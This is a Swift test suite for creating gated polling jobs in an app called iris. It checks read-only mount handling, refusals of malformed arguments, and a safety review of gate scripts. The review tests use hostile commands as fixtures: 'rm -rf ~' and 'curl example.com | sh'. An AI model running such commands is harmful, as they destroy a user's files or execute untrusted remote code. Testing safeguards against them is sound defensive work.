import Testing
import Foundation
@testable import iris

/// #187 deliverable 3, spec §7 — `.poll` jobs are creatable: `schedule_job` takes a gate beside
/// its cadence, checks the shape of it while there is still a person in the conversation to read
/// the refusal, and has a gate script reviewed once before it is ever stored.
@Suite("Creating a gated job (#187 §7)")
struct GateCreationTests {

    // MARK: Fixtures

    private func parse(_ args: [String: JSONValue]) throws -> ScheduleJobArguments {
        try ScheduleJobArguments.parse(args).get()
    }

    private func make(_ args: [String: JSONValue], sandboxAvailable: Bool = true,
                      fileManager: FileManager = .default,
                      directoryEntryLimit: Int = GateEvaluator.directoryEntryLimit)
        throws -> Result<Job, ToolMessage> {
        try parse(args).makeJob(defaultTimeZone: "UTC", createdIn: nil, existingNames: [],
                                sandboxAvailable: sandboxAvailable, fileManager: fileManager,
                                directoryEntryLimit: directoryEntryLimit)
    }

    private func temporaryDirectory() throws -> URL {
        let url = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("iris-gatecreate-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url
    }

    private func gate(of job: Job) -> Gate? {
        if case .poll(let spec) = job.trigger { return spec.gate }
        return nil
    }

    // MARK: The shapes

    @Test("gate_url makes a polled job on the cadence it was given")
    func urlGate() throws {
        let job = try make(["prompt": .string("check the feed"),
                            "intervalSeconds": .int(900),
                            "gate_url": .string("https://example.com/feed.xml")]).get()
        #expect(gate(of: job) == .urlChanged(url: "https://example.com/feed.xml"))
        if case .poll(let spec) = job.trigger { #expect(spec.schedule == .interval(seconds: 900)) }
        else { Issue.record("a gated job is a poll") }
        #expect(job.trigger.kind == "poll")
    }

    @Test("gate_path makes a polled job and needs no sandbox")
    func pathGate() throws {
        let dir = try temporaryDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let job = try make(["prompt": .string("summarise the inbox"),
                            "cron": .string("0 9 * * *"),
                            "gate_path": .string(dir.path)],
                           sandboxAvailable: false).get()
        #expect(gate(of: job) == .pathChanged(path: dir.path))
    }

    @Test("gate_script carries its mounts read-only and its own timeout")
    func scriptGate() throws {
        let dir = try temporaryDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let job = try make(["prompt": .string("report what changed"),
                            "intervalSeconds": .int(3600),
                            "gate_script": .string("diff -q /in/a /in/b >/dev/null && echo UNCHANGED || echo CHANGED"),
                            "gate_mounts": .array([.string("\(dir.path):/in")]),
                            "gate_timeout_seconds": .int(45)]).get()
        guard case .script(let command, let mounts, let timeout) = gate(of: job) else {
            Issue.record("expected a script gate"); return
        }
        #expect(command.hasPrefix("diff -q"))
        #expect(mounts == ["\(IrisPaths.canonicalPath(dir.path)):/in:ro"],
                "a gate's inputs are read-only, always, and stored as the directory they resolve to")
        #expect(timeout == 45)
    }

    /// R33: what is stored — and therefore what the review is shown and what the daemon binds — is
    /// the directory the source resolves to, not the name it was given. A link is a perfectly
    /// legal way to spell a path, and an unresolved one makes every later check a check of the
    /// spelling.
    @Test("a mount through a symlink is stored as the directory it points at")
    func mountsAreStoredResolved() throws {
        let real = try temporaryDirectory()
        defer { try? FileManager.default.removeItem(at: real) }
        let link = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("iris-gatelink-\(UUID().uuidString)")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: real)
        defer { try? FileManager.default.removeItem(at: link) }

        let job = try make(["prompt": .string("p"), "intervalSeconds": .int(600),
                            "gate_script": .string("ls /in >/dev/null; echo UNCHANGED"),
                            "gate_mounts": .array([.string("\(link.path):/in")]),
                            "gate_timeout_seconds": .int(30)]).get()
        guard case .script(let command, let mounts, let timeout) = gate(of: job) else {
            Issue.record("expected a script gate"); return
        }
        let resolved = IrisPaths.canonicalPath(real.path)
        #expect(mounts == ["\(resolved):/in:ro"], "the target the script reads is left as asked for")
        #expect(!mounts[0].hasPrefix(link.path), "and the link's name is not what was stored")

        // And that is what a reviewer is shown — the location, not the spelling.
        let shown = GateScriptReview.details(script: command, mounts: mounts, timeoutSeconds: timeout)
        #expect(shown.contains(resolved))
        #expect(shown.contains("/in"))
        #expect(shown.contains("read-only"))
        #expect(shown.contains("30 seconds"))
        #expect(shown.contains("ls /in"), "the script is still all of the script")
    }

    /// R33: the mounts are the capability, so the two sources that would hand a gate everything
    /// are refused outright rather than reviewed. `/` by any spelling — a link to it is still it.
    @Test("the whole filesystem cannot be a gate's mount, however it is spelled")
    func theRootIsRefused() throws {
        let refused = try make(["prompt": .string("p"), "intervalSeconds": .int(600),
                                "gate_script": .string("echo UNCHANGED"),
                                "gate_mounts": .array([.string("/")])])
        let text = try #require(refused.failureText)
        #expect(text.contains("whole filesystem"))
        #expect(!text.contains("#187") && !text.contains("deliverable"))

        let link = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("iris-gateroot-\(UUID().uuidString)")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: URL(fileURLWithPath: "/"))
        defer { try? FileManager.default.removeItem(at: link) }
        #expect(try make(["prompt": .string("p"), "intervalSeconds": .int(600),
                          "gate_script": .string("echo UNCHANGED"),
                          "gate_mounts": .array([.string(link.path)])]).failureText != nil,
                "a link to / is a mount of /")
    }

    @Test("a script gate with no timeout takes the default, and a silly one is clamped")
    func scriptTimeoutDefaults() throws {
        let plain = try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                              "gate_script": .string("echo UNCHANGED")]).get()
        if case .script(_, _, let timeout) = gate(of: plain) {
            #expect(timeout == GateEvaluator.defaultTimeoutSeconds)
        } else { Issue.record("expected a script gate") }

        let silly = try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                              "gate_script": .string("echo UNCHANGED"),
                              "gate_timeout_seconds": .int(99_999)]).get()
        if case .script(_, _, let timeout) = gate(of: silly) {
            #expect(timeout == GateEvaluator.maxTimeoutSeconds)
        } else { Issue.record("expected a script gate") }
    }

    @Test("an ungated job is still an ordinary scheduled one")
    func noGate() throws {
        let job = try make(["prompt": .string("say hi"), "intervalSeconds": .int(60)]).get()
        #expect(job.trigger == .schedule(.interval(seconds: 60)))
    }

    // MARK: The refusals

    @Test("two gates at once is a refusal, not a guess")
    func twoGates() throws {
        let result = try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                               "gate_url": .string("https://example.com/"),
                               "gate_path": .string("/tmp")])
        #expect(result.failureText?.contains("one gate") == true, "\(String(describing: result))")
    }

    @Test("gate_mounts without a script says so rather than being dropped")
    func mountsWithoutAScript() throws {
        let result = try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                               "gate_url": .string("https://example.com/"),
                               "gate_mounts": .array([.string("/tmp")])])
        #expect(result.failureText?.contains("gate_script") == true, "\(String(describing: result))")
    }

    @Test("R28: a script gate is refused outright when the VM is not available")
    func scriptWithoutTheVM() throws {
        let result = try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                               "gate_script": .string("echo CHANGED")], sandboxAvailable: false)
        let text = try #require(result.failureText)
        #expect(text == ScheduleJobArguments.noRuntimeForGateScript)
        #expect(text.contains("Settings"), "actionable: it says where to fix it")
        #expect(!text.contains("deliverable") && !text.contains("#187"), "and names no milestone")
    }

    @Test("a mount that cannot be one is refused with the reason")
    func badMounts() throws {
        let dir = try temporaryDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("a.txt")
        try "a".write(to: file, atomically: true, encoding: .utf8)

        for entry in ["relative/dir", file.path, "/tmp/\(UUID().uuidString)"] {
            let result = try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                                   "gate_script": .string("echo CHANGED"),
                                   "gate_mounts": .array([.string(entry)])])
            #expect(result.failureText != nil, "'\(entry)' must be refused")
        }
    }

    /// M2: a directory too large to walk on a cadence is refused here, in the conversation that
    /// asked for it, rather than becoming a job that spends minutes of a thread every tick.
    @Test("a gate_path with more entries than the cap is refused while someone is reading")
    func pathTooLargeToWatch() throws {
        let dir = try temporaryDirectory()
        defer { try? FileManager.default.removeItem(at: dir) }
        for i in 0..<4 {
            try "\(i)".write(to: dir.appendingPathComponent("f\(i).txt"), atomically: true, encoding: .utf8)
        }

        let refused = try make(["prompt": .string("p"), "intervalSeconds": .int(900),
                                "gate_path": .string(dir.path)], directoryEntryLimit: 3)
        let text = try #require(refused.failureText)
        #expect(text.contains(dir.path))
        #expect(text.contains("narrower path"), "and it says what to do instead")
        #expect(!text.contains("#187") && !text.contains("deliverable"))

        // The same directory under a cap it fits in is an ordinary gate.
        #expect(try make(["prompt": .string("p"), "intervalSeconds": .int(900),
                          "gate_path": .string(dir.path)], directoryEntryLimit: 4).failureText == nil)
    }

    /// O4: an empty list is how a model spells "no mounts", and the refusal it used to get named
    /// the shape it had already sent. A non-string element is the opposite case: dropping it would
    /// store a gate with fewer inputs than was asked for.
    @Test("an empty gate_mounts reads as none; a non-string element is refused")
    func emptyAndUnreadableMounts() throws {
        let job = try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                            "gate_script": .string("echo UNCHANGED"),
                            "gate_mounts": .array([])]).get()
        guard case .script(_, let mounts, _) = gate(of: job) else {
            Issue.record("expected a script gate"); return
        }
        #expect(mounts.isEmpty)

        // And an empty list beside a gate that has no script is not a refusal either: nothing was
        // asked for, so nothing is dropped.
        #expect(try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                          "gate_url": .string("https://example.com/"),
                          "gate_mounts": .array([])]).failureText == nil)

        let refused = ScheduleJobArguments.parse(["prompt": .string("p"), "intervalSeconds": .int(60),
                                                  "gate_script": .string("echo UNCHANGED"),
                                                  "gate_mounts": .array([.string("/tmp"), .bool(true)])])
        #expect(refused.failureText?.contains("gate_mounts") == true,
                "a mount that is not a path is refused, not dropped")
    }

    @Test("a gate_url that is not a URL, and a gate_path that is not there, are refused")
    func badBuiltins() throws {
        #expect(try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                          "gate_url": .string("ftp://example.com/x")]).failureText != nil)
        #expect(try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                          "gate_path": .string("relative/path")]).failureText != nil)
        #expect(try make(["prompt": .string("p"), "intervalSeconds": .int(60),
                          "gate_path": .string("/nope/\(UUID().uuidString)")]).failureText != nil)
    }

    @Test("a gate still needs a cadence to be checked on")
    func gateWithoutASchedule() throws {
        let result = try make(["prompt": .string("p"), "gate_url": .string("https://example.com/")])
        #expect(result.failureText?.contains("schedule") == true, "\(String(describing: result))")
    }

    @Test("what the model is told about a gated job is a check, not a run")
    func resultSentenceSaysCheck() throws {
        var job = try make(["prompt": .string("p"), "intervalSeconds": .int(900),
                            "gate_url": .string("https://example.com/")]).get()
        job.nextFireAt = Date(timeIntervalSince1970: 1_700_000_000)
        #expect(ScheduleJobArguments.resultSentence(for: job).contains("Next check: "))

        var ungated = try make(["prompt": .string("p"), "intervalSeconds": .int(900)]).get()
        ungated.nextFireAt = Date(timeIntervalSince1970: 1_700_000_000)
        #expect(ScheduleJobArguments.resultSentence(for: ungated).contains("Next run: "))
    }

    @Test("a gate argument of the wrong type is refused, not dropped into an ungated job")
    func wrongTypedGateArguments() {
        for (key, value) in [("gate_url", JSONValue.array([.string("https://example.com/")])),
                             ("gate_path", .object(["path": .string("/tmp")])),
                             ("gate_script", .bool(true))] {
            let parsed = ScheduleJobArguments.parse(["prompt": .string("p"),
                                                     "intervalSeconds": .int(60), key: value])
            #expect(parsed.failureText?.contains(key) == true,
                    "\(key) as \(value) must be refused, not silently ungated")
        }
        // A mount is never a number: unlike the rest of this parser, a `gate_mounts`/`mounts`
        // element must actually be a string, so `gate_mounts: 3` is refused right here at parse
        // (`gateMountsShape`) rather than becoming the path "3" and failing downstream for not
        // being absolute (#282 fix round 1). A container is not a path at all either, and dropping
        // either would build a script gate with fewer inputs than was asked for.
        #expect(ScheduleJobArguments.parse(["prompt": .string("p"), "intervalSeconds": .int(60),
                                            "gate_mounts": .int(3)])
                == .failure(ScheduleJobArguments.gateMountsShape))
        #expect(ScheduleJobArguments.parse(["prompt": .string("p"), "intervalSeconds": .int(60),
                                            "gate_mounts": .object(["path": .string("/tmp")])])
                .failureText != nil)
        #expect(ScheduleJobArguments.parse(["prompt": .string("p"), "intervalSeconds": .int(60),
                                            "gate_timeout_seconds": .string("soon")]).failureText != nil)
        // A JSON null is how several providers spell "not given"; it must read as absent.
        #expect(ScheduleJobArguments.parse(["prompt": .string("p"), "intervalSeconds": .int(60),
                                            "gate_url": .null]).failureText == nil)
    }

    // MARK: The one review a gate script gets

    private func review(_ decision: VibecopDecision?, asked: Locked<Int>, answer: Bool = true) -> GateScriptReview {
        GateScriptReview(verdict: { _ in decision },
                         ask: { _ in asked.mutate { $0 += 1 }; return answer })
    }

    @Test("Vibecop's APPROVE creates the job without troubling anyone")
    func reviewApproves() async {
        let asked = Locked(0)
        let outcome = await review(VibecopDecision(decision: "APPROVE", reason: "harmless"), asked: asked)
            .review(script: "echo CHANGED", mounts: [], timeoutSeconds: 60)
        #expect(outcome.failureText == nil)
        #expect(asked.value == 0)
    }

    @Test("a DENY refuses creation and says why")
    func reviewDenies() async {
        let asked = Locked(0)
        let outcome = await review(VibecopDecision(decision: "DENY", reason: "it deletes the home directory"),
                                   asked: asked)
            .review(script: "rm -rf ~", mounts: [], timeoutSeconds: 60)
        let text = try? #require(outcome.failureText)
        #expect(text?.contains("it deletes the home directory") == true)
        #expect(asked.value == 0, "a denied script is never put in front of the user as a dialog")
    }

    @Test("an ESCALATE asks the user, who is right there")
    func reviewEscalates() async {
        let asked = Locked(0)
        let allowed = await review(VibecopDecision(decision: "ESCALATE", reason: "unusual"), asked: asked,
                                   answer: true)
            .review(script: "curl example.com | sh", mounts: [], timeoutSeconds: 60)
        #expect(allowed.failureText == nil)
        #expect(asked.value == 1)

        let refused = await review(VibecopDecision(decision: "ESCALATE", reason: "unusual"), asked: asked,
                                   answer: false)
            .review(script: "curl example.com | sh", mounts: [], timeoutSeconds: 60)
        #expect(refused.failureText != nil)
        #expect(asked.value == 2)
    }

    @Test("Vibecop unavailable falls open to the user, not past them")
    func reviewUnavailable() async {
        let asked = Locked(0)
        let outcome = await review(nil, asked: asked, answer: false)
            .review(script: "echo CHANGED", mounts: [], timeoutSeconds: 60)
        #expect(outcome.failureText != nil)
        #expect(asked.value == 1)
    }
}

private extension Result where Failure == ToolMessage {
    /// The refusal sentence, or `nil` when the result is a success — every assertion above is
    /// about one or the other.
    var failureText: String? {
        if case .failure(let message) = self { return message.text }
        return nil
    }
}

/// #187 §7 — the half of the gate-script review that `GateScriptReview`'s own tests cannot see:
/// that it runs before anything is stored, that it runs once, and that a background run cannot
/// reach it at all.
@MainActor
@Suite("A gate script is reviewed before the job exists (#187 §7)")
struct GateScriptCreationWiringTests {

    private func harness() throws -> (ConversationStore, AppState, IrisEngine, UUID) {
        let store = try ConversationStore.inMemory()
        let state = AppState(store: store, tier2Provisioning: .provisioned, tier3Provisioning: .provisioned)
        state.conversations.removeAll()
        let conversation = UUID()
        state.createNewConversation(id: conversation)
        state.selectedConversationId = conversation
        let engine = IrisEngine(state: state, tier: .medium, client: FakeLLMClient(responses: []),
                                protectionEnabled: false, sessionPeerCount: 0)
        return (store, state, engine, conversation)
    }

    private func arguments() -> Result<ScheduleJobArguments, ToolMessage> {
        ScheduleJobArguments.parse(["prompt": .string("watch the tree"),
                                    "intervalSeconds": .int(600),
                                    "gate_script": .string("echo CHANGED")])
    }

    @Test("a script Vibecop denies is never stored")
    func deniedScriptIsNotStored() async throws {
        let (store, _, engine, conversation) = try harness()
        let review = GateScriptReview(
            verdict: { _ in VibecopDecision(decision: "DENY", reason: "it pipes the internet to sh") },
            ask: { _ in Issue.record("a denied script must not reach the dialog"); return true })

        let answer = await engine.scheduleJob(arguments(), conversationId: conversation,
                                              review: review, sandboxAvailable: true)

        #expect(answer.contains("it pipes the internet to sh"))
        #expect(try store.ledger.jobs().isEmpty, "nothing is written before the review answers")
    }

    /// R33: the review that matters is the one that sees the capability. Vibecop and the dialog
    /// are handed the same text, and it carries the resolved mounts and the timeout beside the
    /// script — an approval given without sight of them is an approval of the wrong half.
    @Test("both reviewers are shown the mounts and the timeout, not just the script")
    func bothReviewersSeeTheMounts() async throws {
        let (_, _, engine, conversation) = try harness()
        let dir = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("iris-gatewiring-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let resolved = IrisPaths.canonicalPath(dir.path)

        let toVibecop = Locked("")
        let toDialog = Locked("")
        let review = GateScriptReview(
            verdict: { details in
                toVibecop.mutate { $0 = details }
                return VibecopDecision(decision: "ESCALATE", reason: "it reads a directory")
            },
            ask: { details in toDialog.mutate { $0 = details }; return true })

        let answer = await engine.scheduleJob(
            ScheduleJobArguments.parse(["prompt": .string("watch the tree"),
                                        "intervalSeconds": .int(600),
                                        "gate_script": .string("find /in -newer /marker; echo CHANGED"),
                                        "gate_mounts": .array([.string("\(dir.path):/in")]),
                                        "gate_timeout_seconds": .int(45)]),
            conversationId: conversation, review: review, sandboxAvailable: true)

        #expect(answer.contains("Next check"))
        for shown in [toVibecop.value, toDialog.value] {
            #expect(shown.contains("find /in -newer /marker"), "the script")
            #expect(shown.contains(resolved), "the directory it will be able to read")
            #expect(shown.contains("read-only"))
            #expect(shown.contains("45 seconds"), "and how long it may take")
        }
    }

    @Test("an approved script is stored, and reviewed exactly once")
    func approvedScriptIsStoredOnce() async throws {
        let (store, _, engine, conversation) = try harness()
        let reviews = Locked(0)
        let review = GateScriptReview(
            verdict: { _ in
                reviews.mutate { $0 += 1 }
                return VibecopDecision(decision: "APPROVE", reason: "reads a directory")
            },
            ask: { _ in Issue.record("an approved script needs no dialog"); return true })

        let answer = await engine.scheduleJob(arguments(), conversationId: conversation,
                                              review: review, sandboxAvailable: true)

        #expect(reviews.value == 1, "one creation is one dialog's worth of asking")
        #expect(answer.contains("Next check"))
        let stored = try #require(try store.ledger.jobs().first)
        #expect(stored.trigger.gate?.kind == "script")
    }
}
